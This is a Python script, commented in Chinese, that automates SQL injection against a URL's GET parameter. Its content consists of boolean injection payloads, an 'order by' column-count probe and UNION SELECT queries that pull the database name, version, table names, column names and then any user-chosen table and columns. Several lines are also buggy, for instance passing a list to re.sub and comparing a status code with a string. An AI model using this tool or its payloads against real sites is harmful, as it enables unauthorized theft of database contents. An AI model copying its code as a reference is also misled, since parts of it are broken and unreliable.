import requests
import re
from lxml import etree



# 判断注入点语句
check_list1 = ['and 1=1','or 1=1',"'and 1=1 -- a","'or 1=1 -- a",'"and 1=1 --a','"or 1=1 --a']
check_list2 = ['and 1=2','or 1=2',"'and 1=2 -- a","'or 1=2 -- a",'"and 1=2 --a','"or 1=2 --a']
sql_check1 = 'and 1=1'
sql_check2 = 'and 1=2'
# 判断回显语句
sql_check3 = 'order by'
num = 1
# 联合查询
sql_union1= ' union select'


print('请输入sql注入的url')
url = 'http://www.123.com/index.php?id=1'
# http://www.123.com/index.php?id=1

url_content  = re.search('\?.*=\d',url,re.S)


# 判断是否存在get注入点
if url_content ==None:
    print('该url不存在get注入---未检测出注入点')
else:
    # print(url_content)
    # 取出"?id=1",替换成注入语句check_list中的元素

    sql_url1 = re.sub('\?.*=\d',check_list1,url)
    sql_url2 = re.sub('\?.*=\d',check_list2,url)
    # url=url+单字符串
    response1 = requests.get(url=url+sql_check1)
    response2 = requests.get(url=url+sql_check2)
    # url=url+列表取出的字符串
    response3 = requests.get(url=sql_url1)
    response4 = requests.get(url=sql_url2)

 # 判断是否存在回显位置
# if response2.status_code == response1.status_code:
if response2.status_code == '400':
    print('该url不存在get注入---未判断出回显位置')
    exit()
else:
    # 循环判断回显位置有多少个
    for num in range(1,1000):
        order_n = str(num)
        response3 = requests.get(url=url + sql_check3 + order_n)

        # 判断回显位置为几个
        if response3.status_code != 200:
            continue
        elif response3.status_code != 200 and num == 999:
            print('该url不存在get注入---未判断出回显位置有几个')
            exit()
        else:
            order_get = str(num)
            print("回显位置为"+order_get+'个')
            break


# 输出占位符站住回显位置：1，1，
address1 = '1,'
address2 = ' '
if order_get == '1':
    address2 = ' '
else:
    num_order = int(order_get)-1
    for num in range(num_order):
        address2 = address2 + address1

# print(address2)

# 进行sql注入
# 获取数据库名字，版本
response4 =requests.get(url = url + sql_union1 + address2 + 'database()')
response5 =requests.get(url = url + sql_union1 + address2 + 'version()')

response = requests.get(url)

# 将页面可能的回显点取出放在list里面
def change_find(response_text):
    # 去除html标签
    # address_search = re.search('<(\S*?)[^>]*>.*?|<.*?/>',response_text,re.S)
    address_search = re.sub('<(\S*?)[^>]*>.*?|<.*?/>','', response_text.text)
    # except Exception as e:
    #     print(response_text.text)
    #     print(e)

    # address_search1 =re.sub('-->','',address_search)
    # 去除换行符
    address_search2 =re.sub('^\s*|\s*','  ',address_search)

    # address_search4 =re.sub('\s\s','',address_search2)
    # 取出每个字符且分别放入list中
    address_search3 =re.findall('[^(^\s*|\s*)]',address_search2,re.S)
    return address_search3

# 通过对比页面的变化找到--sql注入获取的字符
def result_find(result_old,result_new):
    old_html = change_find(result_old)
    new_html = change_find(result_new)
    html_change = []
    if new_html == old_html:
        print('该url无sql注入---未判断出回显位置数据有变化')
        exit()
    else:
        for i in range(len(old_html)):
            if new_html[i]==old_html[i]:
                continue
            else:
                html_change =  html_change+list(new_html[i])
    # html_change是list，同时存储的是页面所有有变化的地方
    # eg:  输出结果为：  ['1','1','database()']
    return html_change





# 获取数据库名字
sql_insert_result1 = result_find(response,response4)

# 获取数据库版本
sql_insert_result2 = result_find(response,response5)

# 获取数据库表名
response6 =requests.get(url = url + sql_union1 + address2 + 'group_concat(table_name) from information_schema.tables where table_schema = database()')
sql_insert_result3 = result_find(response,response6)

#用来获取数据库表名、字段名的函数
def get_str(text):
    table_name = ''
    for i in text:
        # 去除占位符
        if i =='1':
            continue
        # 获取table_name
        else:
            table_name = table_name + i
    return table_name
table_name = get_str(sql_insert_result3)

# 获取数据库表的字段名
response7 =requests.get(url = url + sql_union1 + address2 + 'group_concat(column_name) from information_schema.columns where table_schema =database() and table_name ='+table_name)
sql_insert_result4 = result_find(response,response7)
column_name = get_str(sql_insert_result4)

print('总表名为'+table_name+'总列名为'+column_name)
print('#输入你想要查询的表名和字段名')
# 获取数据库表的字段下的数据
choose_column = input()
choose_table = input()
response8 =requests.get(url = url + sql_union1 + address2 + choose_column+' from '+choose_table)
sql_insert_result5 = result_find(response,response8)
informations = get_str(sql_insert_result5)
print('你想查询的信息为'+informations)